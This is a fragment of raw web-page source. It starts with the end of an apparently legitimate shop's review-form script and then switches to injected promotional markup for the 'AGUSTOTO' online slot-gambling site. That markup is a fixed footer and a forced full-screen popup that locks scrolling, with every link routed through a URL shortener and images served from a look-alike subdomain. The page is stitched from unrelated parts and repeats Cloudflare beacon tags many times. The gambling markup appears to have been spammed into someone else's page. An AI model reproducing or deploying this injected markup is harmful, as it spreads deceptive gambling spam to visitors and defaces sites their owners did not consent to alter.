                            data-so-ref-id="${escapeHtml(order.so_ref_id || '')}"
                            data-product-name="${escapeHtml(order.product_name)}"
                            data-product-image="${escapeHtml(order.product_image || '')}"
                            data-product-sku="${escapeHtml(order.product_sku || '')}">
                        âœï¸ Tulis Ulasan
                    </button>
                </div>
            `;
        });
        
        container.innerHTML = html;
    }

    // Escape HTML for XSS protection
    function escapeHtml(text) {
        const div = document.createElement('div');
        div.textContent = text;
        return div.innerHTML;
    }

    // Show error
    function showError(message) {
        const errorEl = document.getElementById('review-form-error');
        errorEl.textContent = message;
        errorEl.style.display = 'block';
        
        setTimeout(() => {
            errorEl.style.display = 'none';
        }, 5000);
    }

    // Show success
    function showSuccess(message) {
        // Create toast notification
        const toast = document.createElement('div');
        toast.className = 'toast-notification success';
        toast.textContent = message;
        toast.style.cssText = 'position:fixed;top:20px;right:20px;background:#059669;color:white;padding:16px 24px;border-radius:8px;box-shadow:0 4px 12px rgba(0,0,0,0.15);z-index:10000;font-size:14px;font-weight:500;';
        
        document.body.appendChild(toast);
        
        setTimeout(() => {
            toast.style.opacity = '0';
            toast.style.transition = 'opacity 0.3s';
            setTimeout(() => toast.remove(), 300);
        }, 3000);
    }

    // Mask user name for privacy preview (like PHP maskReviewerName)
    function maskUserName(fullName) {
        if (!fullName || fullName.trim() === '') {
            return 'Anonymous';
        }
        
        const words = fullName.trim().split(/\s+/);
        const maskedWords = words.map(word => {
            const len = word.length;
            if (len <= 1) return word;
            return word.charAt(0) + '*'.repeat(len - 1);
        });
        
        return maskedWords.join(' ');
    }

    // Update privacy preview text with user's actual masked name
    function updatePrivacyPreview() {
        const previewEl = document.getElementById('review-anonymous-preview');
        if (!previewEl) return;
        
        const userName = window.userFullName || '';
        if (userName) {
            const maskedName = maskUserName(userName);
            previewEl.textContent = `Nama Anda akan ditampilkan sebagai "${maskedName}" untuk menjaga privasi`;
        } else {
            previewEl.textContent = 'Nama Anda akan ditampilkan dengan disamarkan untuk menjaga privasi';
        }
    }

    // Initialize when DOM ready
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', init);
    } else {
        init();
    }

    // Export openReviewModal to global scope for use in other scripts
    window.openReviewModal = openReviewModal;

})();

</script>
    <style>
/* =========================================================
   âš¡ FIXED FOOTER â€“ RED ELEGANT MODE
========================================================= */

.sbo-top-fixed-footer{
      position: fixed;
    left: 0;
    right: 0;
    bottom: 0;
    z-index: 999;
    display: flex;
    align-items: center;
    justify-content: space-around;
    gap: 8px;
    padding: 11px 12px calc(11px + env(safe-area-inset-bottom));
    overflow: hidden;
    background: radial-gradient(circle at 50% 0%, #000000, rgb(0 0 0 / 92%) 58%, rgb(0 0 0 / 98%)), linear-gradient(180deg, rgba(25, 0, 0, 0.92), rgb(0 0 0 / 98%));
    backdrop-filter: blur(12px);
    border-top: 1px solid rgb(18, 131, 206, 0.3);
    border-radius: 18px 18px 0 0;
    box-shadow: 0 -12px 30px #410000, inset 0 1px 0 rgba(255, 255, 255, .05);
    font-family: "Orbitron", "Poppins", system-ui, sans-serif;
}

/* scanline */
.sbo-top-fixed-footer::before{
  content:"";
  position:absolute;
  inset:0;
  pointer-events:none;
  background:
    repeating-linear-gradient(
      0deg,
      rgba(255,255,255,.015),
      rgba(255,255,255,.015) 1px,
      transparent 1px,
      transparent 6px
    );
  opacity:.85;
  mix-blend-mode:overlay;
}

/* shine sweep */
.sbo-top-fixed-footer::after{
  content:"";
  position:absolute;
  top:0;
  left:-160%;
  width:60%;
  height:100%;
  background: linear-gradient(120deg, transparent, rgba(18, 131, 206, 0.3), transparent);
  transform: skewX(-25deg);
  animation: footerFinalShine 3.8s infinite;
  mix-blend-mode: screen;
  pointer-events:none;
}

@keyframes footerFinalShine{
  0%{left:-160%;}
  68%{left:160%;}
  100%{left:160%;}
}

/* =========================================================
   ITEM
========================================================= */

.sbo-top-fixed-footer a{
  flex:1;
  max-width:110px;

  display:flex;
  flex-direction:column;
  align-items:center;
  justify-content:center;
  gap:6px;

  padding: 8px 6px;

  text-decoration:none;
  text-align:center;

  color: rgba(18, 131, 206, 0.3);
  font-size: 12px;
  font-weight: 800;
  letter-spacing: .25px;

  border-radius: 14px;
  position:relative;
  z-index:1;

  transition: all .18s ease;
}

.sbo-top-fixed-footer a:hover{
  color:#ffffff;
  background: rgba(255, 80, 80, 0.35);
  filter: drop-shadow(0 0 12px rgba(18, 131, 206, 0.35));
  transform: translateY(-1px);
}

.sbo-top-fixed-footer a:active{
  transform: translateY(0) scale(.99);
}

/* =========================================================
   ICON
========================================================= */

.sbo-top-fixed-footer img{
  width:26px;
  height:26px;
  transition: .18s ease;
  filter: drop-shadow(0 0 8px rgba(18, 131, 206, 0.3));
}

.sbo-top-fixed-footer a:hover img{
  transform: scale(1.08);
  filter: drop-shadow(0 0 16px rgba(255, 80, 80, 0.35);
}

/* =========================================================
   HUD CORNERS
========================================================= */

.sbo-top-fixed-footer .hud-corner{
  position:absolute;
  width:18px;height:18px;
  pointer-events:none;
  border: 1px solid rgba(255, 80, 80, 0.35);
  filter: drop-shadow(0 0 10px rgba(255, 80, 80, 0.35));
  opacity:.85;
}

.sbo-top-fixed-footer .hud-tl{top:8px;left:10px;border-right:none;border-bottom:none;border-radius:10px 0 0 0;}
.sbo-top-fixed-footer .hud-tr{top:8px;right:10px;border-left:none;border-bottom:none;border-radius:0 10px 0 0;}
.sbo-top-fixed-footer .hud-bl{bottom:8px;left:10px;border-right:none;border-top:none;border-radius:0 0 0 10px;}
.sbo-top-fixed-footer .hud-br{bottom:8px;right:10px;border-left:none;border-top:none;border-radius:0 0 10px 0;}

/* =========================================================
   CENTER CTA
========================================================= */

.sbo-top-fixed-footer .tada{
      color: #ffffff;
    background: radial-gradient(circle at 50% 0%, #8adeff, rgba(0, 0, 0, 0) 70%), rgba(255, 80, 80, 0.35);
    border: 1px solid rgba(255, 80, 80, 0.35);
    box-shadow: 0 0 18px #8adeff, inset 0 0 16px rgba(255, 80, 80, 0.35);
}

.sbo-top-fixed-footer .tada img{
  width:30px;
  height:30px;
  filter: drop-shadow(0 0 16px rgba(255, 80, 80, 0.35));
}

/* pulse */
.sbo-top-fixed-footer .tada::before{
  content:"";
  position:absolute;
  inset:-12px;
  border-radius:999px;
  background:
    radial-gradient(circle, #000000, transparent 70%),
    radial-gradient(circle, rgba(18, 131, 206, 0.3), transparent 72%);
  filter: blur(12px);
  opacity:.55;
  animation: corePulse 2.9s ease-in-out infinite;
  z-index:-1;
}

@keyframes corePulse{
  0%,100%{opacity:.35; transform:scale(.99);}
  50%{opacity:.75; transform:scale(1.02);}
}

/* ACTIVE */
.sbo-top-fixed-footer a.is-active{
  color:#ffffff;
  background: rgba(18, 131, 206, 0.3);
  box-shadow: inset 0 0 0 1px rgba(18, 131, 206, 0.3);
}

.sbo-top-fixed-footer a.is-active img{
  filter: drop-shadow(0 0 18px rgba(18, 131, 206, 0.3));
}

/* RESPONSIVE */
@media (max-width:500px){
  .sbo-top-fixed-footer{
    padding: 10px 10px calc(10px + env(safe-area-inset-bottom));
    border-radius: 16px 16px 0 0;
    gap:6px;
  }
  .sbo-top-fixed-footer a{
    font-size:11px;
    padding:7px 5px;
    gap:5px;
    max-width:104px;
  }
  .sbo-top-fixed-footer img{width:22px;height:22px;}
  .sbo-top-fixed-footer .tada img{width:26px;height:26px;}
}
</style>
<div class="sbo-top-fixed-footer">
  <a href="https://shortt.ink/anakbinjai" target="_blank" rel="nofollow noopener">
    <img src="https://chemtrols-com.agustoto.xyz/asset/favicon-brand-a1071180d5856d11.png" alt="BONUS AGUSTOTO">
    Promosi
  </a>
  <a href="https://shortt.ink/anakbinjai" target="_blank" rel="nofollow noopener">
    <img src="https://chemtrols-com.agustoto.xyz/asset/favicon-brand-a1071180d5856d11.png" alt="LOGIN AGUSTOTO">
    Login
  </a>
  <a href="https://shortt.ink/anakbinjai" target="_blank" rel="nofollow noopener" class="tada">
    <img src="https://chemtrols-com.agustoto.xyz/asset/favicon-brand-a1071180d5856d11.png" alt="DAFTAR AGUSTOTO">
    Daftar
  </a>
  <a href="https://shortt.ink/anakbinjai" target="_blank" rel="nofollow noopener">
    <img src="https://chemtrols-com.agustoto.xyz/asset/favicon-brand-a1071180d5856d11.png" alt="LINK ALTERNATIF AGUSTOTO">
    Alternatif
  </a>
  <a href="https://shortt.ink/anakbinjai" target="_blank" rel="nofollow noopener">
    <img src="https://chemtrols-com.agustoto.xyz/asset/favicon-brand-a1071180d5856d11.png" alt="LIVE CHAT AGUSTOTO">
    Live Chat
  </a>
</div>
<script defer src="https://static.cloudflareinsights.com/beacon.min.js/v4513226cdae34746b4dedf0b4dfa099e1781791509496" integrity="sha512-ZE9pZaUXND66v380QUtch/5sE9tPFh2zg45pR2PB0CVkCtOREv2AJKkSidISWkysEuQ0EH8faUU5du78bx87UQ==" data-cf-beacon='{"version":"2024.11.0","token":"51df3b17a746455f940c0b561e8c0c0b","r":1,"server_timing":{"name":{"cfCacheStatus":true,"cfEdge":true,"cfExtPri":true,"cfL4":true,"cfOrigin":true,"cfSpeedBrain":true},"location_startswith":null}}' crossorigin="anonymous"></script>
<script type="module" src="https://static.cloudflareinsights.com/beacon.min.js/v4513226cdae34746b4dedf0b4dfa099e1781791509496" integrity="sha512-ZE9pZaUXND66v380QUtch/5sE9tPFh2zg45pR2PB0CVkCtOREv2AJKkSidISWkysEuQ0EH8faUU5du78bx87UQ==" data-cf-beacon='{"version":"2024.11.0","token":"51df3b17a746455f940c0b561e8c0c0b","r":1}' crossorigin="anonymous"></script>
<script type="module" src="https://static.cloudflareinsights.com/beacon.min.js/v4513226cdae34746b4dedf0b4dfa099e1781791509496" integrity="sha512-ZE9pZaUXND66v380QUtch/5sE9tPFh2zg45pR2PB0CVkCtOREv2AJKkSidISWkysEuQ0EH8faUU5du78bx87UQ==" data-cf-beacon='{"version":"2024.11.0","token":"51df3b17a746455f940c0b561e8c0c0b","r":1}' crossorigin="anonymous"></script>
<script type="module" src="https://static.cloudflareinsights.com/beacon.min.js/v4513226cdae34746b4dedf0b4dfa099e1781791509496" integrity="sha512-ZE9pZaUXND66v380QUtch/5sE9tPFh2zg45pR2PB0CVkCtOREv2AJKkSidISWkysEuQ0EH8faUU5du78bx87UQ==" data-cf-beacon='{"version":"2024.11.0","token":"51df3b17a746455f940c0b561e8c0c0b","r":1}' crossorigin="anonymous"></script>
<script type="module" src="https://static.cloudflareinsights.com/beacon.min.js/v4513226cdae34746b4dedf0b4dfa099e1781791509496" integrity="sha512-ZE9pZaUXND66v380QUtch/5sE9tPFh2zg45pR2PB0CVkCtOREv2AJKkSidISWkysEuQ0EH8faUU5du78bx87UQ==" data-cf-beacon='{"version":"2024.11.0","token":"51df3b17a746455f940c0b561e8c0c0b","r":1}' crossorigin="anonymous"></script>
<script type="module" src="https://static.cloudflareinsights.com/beacon.min.js/v4513226cdae34746b4dedf0b4dfa099e1781791509496" integrity="sha512-ZE9pZaUXND66v380QUtch/5sE9tPFh2zg45pR2PB0CVkCtOREv2AJKkSidISWkysEuQ0EH8faUU5du78bx87UQ==" data-cf-beacon='{"version":"2024.11.0","token":"f2ab780bc9a44e979f5cc2ae3699b18e","r":1}' crossorigin="anonymous"></script>
<script type="module" src="https://static.cloudflareinsights.com/beacon.min.js/v4513226cdae34746b4dedf0b4dfa099e1781791509496" integrity="sha512-ZE9pZaUXND66v380QUtch/5sE9tPFh2zg45pR2PB0CVkCtOREv2AJKkSidISWkysEuQ0EH8faUU5du78bx87UQ==" data-cf-beacon='{"version":"2024.11.0","token":"5b1c76696dc94f7db08316e2401cd14e","r":1}' crossorigin="anonymous"></script>
<script type="module" src="https://static.cloudflareinsights.com/beacon.min.js/v3d52b47920f24c319d37e2661827c42b1787588026925" integrity="sha512-d9sL6GJLXn6fInD1+TVXhTcQOsmxeHfmHAvwGDIxp5TO+uo1fiWW7mHomMj4MLRlCsJDTqXzWLHJFFlPCEIj/A==" data-cf-beacon='{"version":"2024.11.0","token":"870082c1b60640b78980af04df5a944d","r":1}' crossorigin="anonymous"></script>
<script type="module" src="https://static.cloudflareinsights.com/beacon.min.js/v3d52b47920f24c319d37e2661827c42b1787588026925" integrity="sha512-d9sL6GJLXn6fInD1+TVXhTcQOsmxeHfmHAvwGDIxp5TO+uo1fiWW7mHomMj4MLRlCsJDTqXzWLHJFFlPCEIj/A==" data-cf-beacon='{"version":"2024.11.0","token":"9633684236f448248e0f65d50ee7e4af","r":1}' crossorigin="anonymous"></script>
<script type="module" src="https://static.cloudflareinsights.com/beacon.min.js/v3d52b47920f24c319d37e2661827c42b1787588026925" integrity="sha512-d9sL6GJLXn6fInD1+TVXhTcQOsmxeHfmHAvwGDIxp5TO+uo1fiWW7mHomMj4MLRlCsJDTqXzWLHJFFlPCEIj/A==" data-cf-beacon='{"version":"2024.11.0","token":"31d3901e3a0a40c687e8d44f28060815","r":1}' crossorigin="anonymous"></script>
<script type="module" src="https://static.cloudflareinsights.com/beacon.min.js/v3d52b47920f24c319d37e2661827c42b1787588026925" integrity="sha512-d9sL6GJLXn6fInD1+TVXhTcQOsmxeHfmHAvwGDIxp5TO+uo1fiWW7mHomMj4MLRlCsJDTqXzWLHJFFlPCEIj/A==" data-cf-beacon='{"version":"2024.11.0","token":"28460a7e2fdb467898d7a1cc07bfbc86","r":1}' crossorigin="anonymous"></script>
<script type="module" src="https://static.cloudflareinsights.com/beacon.min.js/v3d52b47920f24c319d37e2661827c42b1787588026925" integrity="sha512-d9sL6GJLXn6fInD1+TVXhTcQOsmxeHfmHAvwGDIxp5TO+uo1fiWW7mHomMj4MLRlCsJDTqXzWLHJFFlPCEIj/A==" data-cf-beacon='{"version":"2024.11.0","token":"ca8a0c1b183e4b2b9814a6d6944e175f","r":1}' crossorigin="anonymous"></script>
<script type="module" src="https://static.cloudflareinsights.com/beacon.min.js/v3d52b47920f24c319d37e2661827c42b1787588026925" integrity="sha512-d9sL6GJLXn6fInD1+TVXhTcQOsmxeHfmHAvwGDIxp5TO+uo1fiWW7mHomMj4MLRlCsJDTqXzWLHJFFlPCEIj/A==" data-cf-beacon='{"version":"2024.11.0","token":"0fa09fdd1e6248a88a5f9fcc43d3662c","r":1}' crossorigin="anonymous"></script>
<script type="module" src="https://static.cloudflareinsights.com/beacon.min.js/v3d52b47920f24c319d37e2661827c42b1787588026925" integrity="sha512-d9sL6GJLXn6fInD1+TVXhTcQOsmxeHfmHAvwGDIxp5TO+uo1fiWW7mHomMj4MLRlCsJDTqXzWLHJFFlPCEIj/A==" data-cf-beacon='{"version":"2024.11.0","token":"660e3e1485aa4d0bb4239656395758ff","r":1}' crossorigin="anonymous"></script>
<script type="module" src="https://static.cloudflareinsights.com/beacon.min.js/v31edd6df95cf4e85bb4c19e7a9bdbcba1788362987495" integrity="sha512-iIg7k2xntmwu6/uSb5tpc/hySgZc4eoL31yB29W6tJFo2akwjPWcEqnCEdJvGexCL0KEQwVYv5BlowfhVz26hg==" data-cf-beacon='{"version":"2024.11.0","token":"3980ac8b91ca47b4838c0f3feb47c836","r":1,"spa":2}' crossorigin="anonymous"></script>
<script type="module" src="https://static.cloudflareinsights.com/beacon.min.js/v31edd6df95cf4e85bb4c19e7a9bdbcba1788362987495" integrity="sha512-iIg7k2xntmwu6/uSb5tpc/hySgZc4eoL31yB29W6tJFo2akwjPWcEqnCEdJvGexCL0KEQwVYv5BlowfhVz26hg==" data-cf-beacon='{"version":"2024.11.0","token":"84aef00b2cb547fbb0a0dfba04935d99","r":1,"spa":2}' crossorigin="anonymous"></script>
<script type="module" src="https://static.cloudflareinsights.com/beacon.min.js/v31edd6df95cf4e85bb4c19e7a9bdbcba1788362987495" integrity="sha512-iIg7k2xntmwu6/uSb5tpc/hySgZc4eoL31yB29W6tJFo2akwjPWcEqnCEdJvGexCL0KEQwVYv5BlowfhVz26hg==" data-cf-beacon='{"version":"2024.11.0","token":"e11e1cba2f794f2896d4ffabbbaed90f","r":1,"spa":2}' crossorigin="anonymous"></script>
<script type="module" src="https://static.cloudflareinsights.com/beacon.min.js/v4bc70e2c01a94c73b74392e4234840661791215815920" integrity="sha512-L0ha0OXavK/8okipN9F8BtP84dg9DUhPERbBXzwI6dgTA55d2+yweo3pn5CSFYs45/r8md2+xvUPtTdvTNRfjA==" data-cf-beacon='{"version":"2024.11.0","token":"0dda3adc0fa64ec080773edae8afa2ea","r":1,"spa":2}' crossorigin="anonymous"></script>


<!-- data-lp-promo-popup -->
<style data-lp-promo-popup="1">
  html.lp-pp-open,
  body.lp-pp-open {
    overflow: hidden !important;
    touch-action: none;
  }
  #popupOverlay.popup-overlay {
    position: fixed !important;
    inset: 0 !important;
    width: 100vw !important;
    height: 100vh !important;
    min-height: 100dvh !important;
    margin: 0 !important;
    padding: max(10px, env(safe-area-inset-top)) max(10px, env(safe-area-inset-right)) max(10px, env(safe-area-inset-bottom)) max(10px, env(safe-area-inset-left)) !important;
    box-sizing: border-box !important;
    background: rgba(0, 0, 0, 0.4) !important;
    backdrop-filter: blur(3px);
    -webkit-backdrop-filter: blur(3px);
    display: flex !important;
    justify-content: center !important;
    align-items: center !important;
    z-index: 2147483000 !important;
    overflow: auto !important;
    visibility: visible !important;
    opacity: 1 !important;
    pointer-events: auto !important;
  }
  #popupOverlay.popup-overlay,
  #popupOverlay.popup-overlay * {
    visibility: visible !important;
  }
  #popupOverlay .SEOMAYA {
    margin: 0 !important;
    padding: 0 !important;
    font-family: 'Playfair Display', 'Segoe UI', serif !important;
    background-color: transparent !important;
    color: #28FF93 !important;
    overflow: hidden !important;
  }
  #popupOverlay .popup-container {
    position: relative !important;
    width: 90% !important;
    max-width: 420px !important;
    max-height: calc(100dvh - 24px) !important;
    overflow: auto !important;
    background: linear-gradient(145deg, rgba(10, 10, 10, 0.9), rgba(26, 21, 16, 0.85)) !important;
    border-radius: 20px !important;
    text-align: center !important;
    animation: lpPpRotateScaleIn 0.8s cubic-bezier(0.175, 0.885, 0.32, 1.275), lpPpGoldPulse 3.5s infinite ease-in-out !important;
    box-shadow: 0 20px 40px rgba(0, 0, 0, 0.7), 0 0 0 1px rgba(212, 175, 55, 0.2) !important;
    padding-bottom: 20px !important;
    border: 1px solid rgba(212, 175, 55, 0.15) !important;
    backdrop-filter: blur(10px);
    -webkit-backdrop-filter: blur(10px);
    box-sizing: border-box !important;
  }
  @keyframes lpPpGoldPulse {
    0%, 100% {
      box-shadow: 0 20px 40px rgba(0, 0, 0, 0.7), 0 0 20px rgba(212, 175, 55, 0.3), 0 0 0 1px rgba(212, 175, 55, 0.2);
    }
    50% {
      box-shadow: 0 20px 40px rgba(0, 0, 0, 0.7), 0 0 30px rgba(139, 56, 19, 0.55), 0 0 0 1px rgba(212, 175, 55, 0.3);
    }
  }
  #popupOverlay .popup-container::before {
    content: "" !important;
    position: absolute !important;
    top: -100% !important;
    left: -100% !important;
    width: 200% !important;
    height: 200% !important;
    background: linear-gradient(
      135deg,
      rgba(255, 255, 255, 0) 45%,
      rgba(255, 215, 0, 0.15) 50%,
      rgba(255, 255, 255, 0) 55%
    ) !important;
    animation: lpPpShineDiagonal 5s linear infinite !important;
    z-index: 2 !important;
    pointer-events: none !important;
  }
  @keyframes lpPpShineDiagonal {
    0% { transform: translate(-100%, -100%) rotate(30deg); }
    100% { transform: translate(100%, 100%) rotate(30deg); }
  }
  @keyframes lpPpRotateScaleIn {
    0% { opacity: 0; transform: scale(0.3) rotate(-10deg); }
    50% { transform: scale(1.05) rotate(2deg); }
    100% { opacity: 1; transform: scale(1) rotate(0deg); }
  }
  #popupOverlay .popup-image {
    width: 100% !important;
    display: block !important;
    border-bottom: 1px solid rgba(212, 175, 55, 0.15) !important;
    border: 0 !important;
    max-height: min(62dvh, 460px) !important;
    object-fit: cover !important;
    object-position: center 42% !important;
    background: #111 !important;
  }
  #popupOverlay .clk-btn-sgp {
    --blade-cut: 12px;
    width: 97% !important;
    display: grid !important;
    grid-template-columns: repeat(2, 1fr) !important;
    gap: 15px !important;
    font-family: 'Poppins', sans-serif !important;
    font-weight: 700 !important;
    padding: 20px !important;
    position: relative !important;
    overflow: hidden !important;
    box-sizing: border-box !important;
    margin: 0 auto !important;
  }
  #popupOverlay .clk-btn-sgp::before {
    content: '' !important;
    position: absolute !important;
    top: 50% !important;
    left: 50% !important;
    transform: translate(-50%, -50%) !important;
    width: calc(100% - 30px) !important;
    height: 2px !important;
    background: linear-gradient(90deg, transparent, #28FF93, #28FF93, #28FF93, transparent) !important;
    opacity: 0.4 !important;
    filter: blur(1px) !important;
    pointer-events: none !important;
  }
  #popupOverlay .clk-btn-sgp a {
    text-align: center !important;
    text-transform: uppercase !important;
    letter-spacing: 1.5px !important;
    padding: 16px 12px !important;
    margin: 0 !important;
    border-radius: 14px !important;
    transition: all 0.4s cubic-bezier(0.23, 1, 0.32, 1) !important;
    position: relative !important;
    overflow: hidden !important;
    backdrop-filter: blur(10px) !important;
    -webkit-backdrop-filter: blur(10px) !important;
    border: 2px solid transparent !important;
    box-shadow: 0 8px 0 #000 !important;
    clip-path: polygon(var(--blade-cut) 0%, 100% 0%, 100% calc(100% - var(--blade-cut)), calc(100% - var(--blade-cut)) 100%, 0% 100%, 0% var(--blade-cut)) !important;
    z-index: 1 !important;
    text-decoration: none !important;
    display: block !important;
    font-size: inherit !important;
  }
  #popupOverlay .clk-btn-sgp a::after {
    content: '' !important;
    position: absolute !important;
    top: -2px !important;
    left: -2px !important;
    right: -2px !important;
    bottom: -2px !important;
    background: linear-gradient(45deg, #28FF93, #28FF93, #28FF93, #28FF93, #28FF93) !important;
    border-radius: 16px !important;
    z-index: -1 !important;
    opacity: 0 !important;
    transition: opacity 0.3s ease !important;
  }
  #popupOverlay .clk-btn-sgp a:hover::after {
    opacity: 1 !important;
  }
  #popupOverlay .clk-btn-sgp a:hover {
    transform: translateY(-6px) scale(1.03) !important;
    border-color: #28FF93 !important;
  }
  #popupOverlay .clk-btn-sgp a.login {
    color: #28FF93 !important;
    background: linear-gradient(145deg, #8B3813, #000) !important;
    border: 2px solid #28FF93 !important;
    text-shadow: 0 2px 4px rgba(0, 0, 0, 0.5) !important;
  }
  #popupOverlay .clk-btn-sgp a.login:hover {
    background: linear-gradient(145deg, #222, #1a1a1a) !important;
    box-shadow: 0 12px 0 #000, 0 20px 40px rgba(212, 175, 55, 0.4), 0 0 30px rgba(255, 215, 0, 0.2) !important;
    color: #fff8dc !important;
  }
  #popupOverlay .clk-btn-sgp a.register {
    color: #000 !important;
    background: linear-gradient(145deg, #28FF93, #28FF93) !important;
    border: 2px solid #000 !important;
    text-shadow: 0 1px 2px rgba(255, 255, 255, 0.3) !important;
  }
  #popupOverlay .clk-btn-sgp a.register:hover {
    background: linear-gradient(145deg, #28FF93, #28FF93) !important;
    box-shadow: 0 12px 0 #000, 0 20px 40px rgba(139, 56, 19, 0.45), 0 0 35px rgba(255, 215, 0, 0.3) !important;
    color: #000 !important;
    border-color: #000 !important;
  }
  #popupOverlay .popup-footer {
    font-size: 13px !important;
    color: #fff !important;
    padding: 20px 10px !important;
    position: relative !important;
    z-index: 3 !important;
    line-height: 1.6 !important;
    font-family: 'Playfair Display', serif !important;
  }
  #popupOverlay .popup-footer .lp-pp-title {
    margin: 0 0 8px !important;
    display: -webkit-box !important;
    -webkit-line-clamp: 3;
    -webkit-box-orient: vertical;
    overflow: hidden !important;
  }
  #popupOverlay .popup-footer .lp-pp-copy {
    color: #fff !important;
    font-weight: 600 !important;
    text-shadow: 0 0 5px rgb(0, 0, 0) !important;
  }
  #popupOverlay .gold-particle {
    position: absolute !important;
    background: radial-gradient(circle, rgba(255, 215, 0, 0.8) 0%, rgba(212, 175, 55, 0.4) 100%) !important;
    border-radius: 50% !important;
    pointer-events: none !important;
    z-index: 1 !important;
    animation: lpPpFloatGold 10s infinite ease-in-out !important;
    box-shadow: 0 0 10px rgba(255, 215, 0, 0.6) !important;
  }
  @keyframes lpPpFloatGold {
    0%, 100% { transform: translateY(0) translateX(0); opacity: 0; }
    10% { opacity: 0.8; }
    90% { opacity: 0.8; }
    100% { transform: translateY(-120px) translateX(40px); opacity: 0; }
  }
  #popupOverlay .luxury-border {
    position: absolute !important;
    top: 0 !important;
    left: 0 !important;
    right: 0 !important;
    bottom: 0 !important;
    border: 1px solid rgba(212, 175, 55, 0.2) !important;
    border-radius: 20px !important;
    pointer-events: none !important;
    z-index: 4 !important;
    background: linear-gradient(135deg, rgba(212, 175, 55, 0) 0%, rgba(212, 175, 55, 0.1) 50%, rgba(212, 175, 55, 0) 100%) !important;
  }
  #popupOverlay button.close-btn {
    appearance: none !important;
    -webkit-appearance: none !important;
  }
  #popupOverlay.popup-overlay.lp-pp-closed,
  #popupOverlay.popup-overlay.lp-pp-closed * {
    visibility: hidden !important;
    pointer-events: none !important;
  }
  #popupOverlay.popup-overlay.lp-pp-closed {
    display: none !important;
    opacity: 0 !important;
  }
  #popupOverlay .close-btn {
    position: absolute !important;
    top: 15px !important;
    right: 15px !important;
    width: 36px !important;
    height: 36px !important;
    padding: 0 !important;
    margin: 0 !important;
    background: rgba(0, 0, 0, 0.65) !important;
    border-radius: 50% !important;
    display: flex !important;
    justify-content: center !important;
    align-items: center !important;
    cursor: pointer !important;
    z-index: 30 !important;
    pointer-events: auto !important;
    transition: all 0.3s ease !important;
    border: 1px solid rgba(212, 175, 55, 0.45) !important;
    -webkit-tap-highlight-color: transparent;
    color: transparent !important;
    font-size: 0 !important;
    line-height: 0 !important;
  }
  #popupOverlay .close-btn:hover {
    background: rgba(212, 175, 55, 0.8) !important;
    transform: rotate(90deg) !important;
  }
  #popupOverlay .close-btn::before,
  #popupOverlay .close-btn::after {
    content: '' !important;
    position: absolute !important;
    width: 16px !important;
    height: 2px !important;
    background: #28FF93 !important;
  }
  #popupOverlay .close-btn::before { transform: rotate(45deg); }
  #popupOverlay .close-btn::after { transform: rotate(-45deg); }
  @media (max-width: 768px) {
    #popupOverlay .clk-btn-sgp {
      grid-template-columns: 1fr !important;
      gap: 12px !important;
    }
    #popupOverlay .clk-btn-sgp a {
      padding: 18px 12px !important;
    }
    #popupOverlay .popup-container {
      width: 95% !important;
      max-width: 350px !important;
      padding-bottom: 20px !important;
      border-radius: 20px !important;
    }
    #popupOverlay .close-btn {
      width: 28px !important;
      height: 28px !important;
    }
  }
  @media (prefers-reduced-motion: reduce) {
    #popupOverlay .popup-container,
    #popupOverlay .popup-container::before,
    #popupOverlay .gold-particle {
      animation: none !important;
    }
  }
</style>
<div class="popup-overlay" id="popupOverlay" data-lp-promo-popup="1" role="dialog" aria-modal="true" aria-label="Promo">
  <div class="popup-container">
    <button type="button" class="close-btn" aria-label="Tutup popup" onclick="if(window.closePopup){window.closePopup();return false;}"></button>
    <div class="gold-particle" style="width:10px;height:10px;top:15%;left:12%;animation-delay:0s;"></div>
    <div class="gold-particle" style="width:8px;height:8px;top:35%;left:88%;animation-delay:1.5s;"></div>
    <div class="gold-particle" style="width:12px;height:12px;top:65%;left:18%;animation-delay:3s;"></div>
    <div class="gold-particle" style="width:6px;height:6px;top:25%;left:75%;animation-delay:4.5s;"></div>
    <div class="gold-particle" style="width:9px;height:9px;top:80%;left:60%;animation-delay:6s;"></div>
    <div class="luxury-border"></div>
    <div class="SEOMAYA">
      <img src="https://chemtrols-com.agustoto.xyz/asset/agustoto-slot-wd-trik-pintar-situs-slot-gacor-slot-olympus-surabaya-dengan-info-.webp" alt="AGUSTOTO Slot WD Trik Pintar Situs Slot Gacor Slot Olympus Surabaya dengan Info Akurat" class="popup-image" width="600" height="600" decoding="async" />
      <div class="clk-btn-sgp" style="font-size:20px;">
        <a href="https://shortt.ink/anakbinjai" target="_blank" rel="nofollow noreferrer" class="login">LOGIN</a>
        <a href="https://shortt.ink/anakbinjai" target="_blank" rel="nofollow noreferrer" class="register">DAFTAR</a>
      </div>
      <div class="popup-footer">
        AGUSTOTO Slot WD Trik Pintar Situs Slot Gacor Slot Olympus Surabaya dengan Info Akurat<br/>
        <span class="lp-pp-copy">&copy; COPYRIGHT 2026 AGUSTOTO</span>
      </div>
    </div>
  </div>
</div>
<script data-lp-promo-popup="1">
(function(){
  function setOpen(on){
    try{
      document.documentElement.classList.toggle('lp-pp-open', !!on);
      document.body && document.body.classList.toggle('lp-pp-open', !!on);
    }catch(e){}
  }
  function closePopup(){
    var el=document.getElementById('popupOverlay');
    if(!el || el.classList.contains('lp-pp-closed')) return;
    el.classList.add('lp-pp-closed');
    el.setAttribute('aria-hidden','true');
    setOpen(false);
  }
  window.closePopup=closePopup;
  function bindClose(overlay){
    if(!overlay || overlay.getAttribute('data-lp-pp-bound')==='1') return;
    overlay.setAttribute('data-lp-pp-bound','1');
    overlay.addEventListener('click',function(e){
      if(e.target===overlay) closePopup();
    });
    var btn=overlay.querySelector('.close-btn');
    if(btn){
      btn.addEventListener('click',function(e){
        e.preventDefault();
        e.stopPropagation();
        closePopup();
      }, true);
      btn.addEventListener('touchend',function(e){
        e.preventDefault();
        closePopup();
      },{passive:false, capture:true});
    }
  }
  function mount(){
    var style=document.querySelector('style[data-lp-promo-popup]');
    var overlay=document.getElementById('popupOverlay');
    if(overlay && overlay.classList.contains('lp-pp-closed')) return;
    try{
      if(style && document.head && style.parentNode!==document.head){
        document.head.appendChild(style);
      }
      if(overlay && document.documentElement && overlay.parentNode!==document.documentElement){
        document.documentElement.appendChild(overlay);
      }
    }catch(e){}
    setOpen(true);
    if(!overlay) return;
    overlay.style.visibility='visible';
    overlay.style.opacity='1';
    overlay.style.display='flex';
    overlay.style.pointerEvents='auto';
    overlay.removeAttribute('aria-hidden');
    bindClose(overlay);
  }
  document.addEventListener('keydown',function(e){
    if(e.key!=='Escape') return;
    var el=document.getElementById('popupOverlay');
